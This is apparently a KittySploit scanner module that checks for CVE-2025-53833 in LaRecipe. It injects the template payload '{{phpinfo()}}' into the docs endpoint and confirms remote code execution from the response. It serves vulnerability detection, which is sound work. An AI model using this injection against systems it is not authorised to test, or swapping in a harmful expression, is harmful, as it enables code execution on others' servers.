#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LaRecipe < 2.8.1 Remote Code Execution via SSTI"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "LaRecipe < 2.8.1 Remote Code Execution via SSTI",
        "description": "LaRecipe docs endpoint evaluates Blade/SSTI in query string leading to RCE.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-53833",
        "tags": ["web", "scanner", "cve", "cve2025", "vuln", "larecipe", "rce", "ssti", "vkev"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": [
            "https://github.com/saleem-hadad/larecipe/security/advisories/GHSA-jv7x-xhv2-p5v2",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-53833",
        ],
    }

    def run(self):
        # Literal {{phpinfo()}} must not be framework-templated away.
        path = "/docs/1.0/?{{phpinfo()}}"
        r = self.http_request(method="GET", path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        if not all(m in body for m in ("PHP Extension", "PHP Version", "larecipe")):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2025-53833",
            reason="LaRecipe rendered phpinfo() via SSTI on /docs/1.0/",
            path="/docs/1.0/",
            confidence="high",
        )
        return True
